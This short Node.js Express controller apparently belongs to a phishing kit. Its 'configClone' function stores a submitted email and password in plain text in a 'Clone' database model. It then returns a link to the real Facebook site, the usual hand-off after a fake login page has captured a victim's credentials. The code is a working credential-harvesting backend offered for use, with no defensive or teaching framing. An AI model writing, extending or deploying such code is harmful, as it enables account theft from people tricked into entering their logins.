const Clone = require("../models/clone.model");

const configClone = async (request, response) => {
  try {
    let { email, password } = request.body;

    let clone = new Clone({
      email,
      password,
    });
    await clone.save();

    const responseDTO = {
      isSuccess: true,
      cloneConfigurationUrl: "https://www.facebook.com",
    };

    response.json({ responseDTO });
  } catch (error) {}
};

module.exports = { configClone };
